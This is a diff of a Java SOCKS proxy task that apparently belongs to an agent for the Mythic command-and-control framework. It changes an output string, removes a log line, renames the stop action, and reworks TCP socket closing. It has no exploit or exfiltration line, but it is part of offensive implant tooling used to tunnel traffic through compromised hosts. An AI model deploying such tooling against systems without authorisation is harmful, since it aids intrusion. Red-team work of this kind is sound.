@@ -85,7 +85,7 @@ public class SocksBackgroundTask implements Runnable {
             Map<String, Object> response = new HashMap<>();
             response.put("task_id", task.taskId);
             response.put("status", "listening");
-            response.put("user_output", "SOCKS proxy listening");
+            response.put("user_output", "SOCKS proxy listening\n");
             response.put("completed", false);
             task.sendResponse(response);
             
@@ -99,7 +99,6 @@ public class SocksBackgroundTask implements Runnable {
                     JsonNode message = task.getToTaskQueue().poll(100, java.util.concurrent.TimeUnit.MILLISECONDS);
                     
                     if (message != null) {
-                        socksLog("Received message from Mythic: " + message.toString());
                         handleMythicMessage(message);
                     }
                     
@@ -132,9 +131,9 @@ public class SocksBackgroundTask implements Runnable {
         Config.debugLog(config, "[socks] ===== Received message from Mythic =====");
         Config.debugLog(config, "[socks] Full message: " + message.toString());
         
-        // Check for jobkill action
-        if (message.has("action") && "jobkill".equals(message.get("action").asText())) {
-            Config.debugLog(config, "[socks] Received jobkill, stopping SOCKS proxy");
+        // Check if this is a stop action
+        if (message.has("action") && "stop".equals(message.get("action").asText())) {
+            Config.debugLog(config, "[socks] Received stop action, stopping SOCKS proxy");
             task.running = false;
             return;
         }
@@ -377,9 +376,7 @@ public class SocksBackgroundTask implements Runnable {
                 Config.debugLog(config, "[socks] Write thread error: " + e.getMessage());
             } finally {
                 conn.running = false;
-                try {
-                    conn.targetSocket.close();
-                } catch (Exception ignored) {}
+                // Don't close the socket here - let the read thread close it after receiving remote's FIN
             }
         });
         
@@ -509,10 +506,10 @@ public class SocksBackgroundTask implements Runnable {
         void close() {
             running = false;
             if (targetSocket != null && !targetSocket.isClosed()) {
-                // Properly shutdown TCP to send FIN and unblock pending I/O on both threads
-                try { targetSocket.shutdownInput(); } catch (Exception ignored) {}
+                // Shutdown output (write side) to send FIN, but keep input (read side) open
+                // This allows read thread to receive the remote's FIN for proper TCP close handshake
+                // DO NOT call targetSocket.close() here - let the read thread close it after receiving remote's FIN
                 try { targetSocket.shutdownOutput(); } catch (Exception ignored) {}
-                try { targetSocket.close(); } catch (Exception ignored) {}
             }
             // Interrupt both threads to unblock any waiting operations (e.g. BlockingQueue.take())
             if (forwardThread != null) {
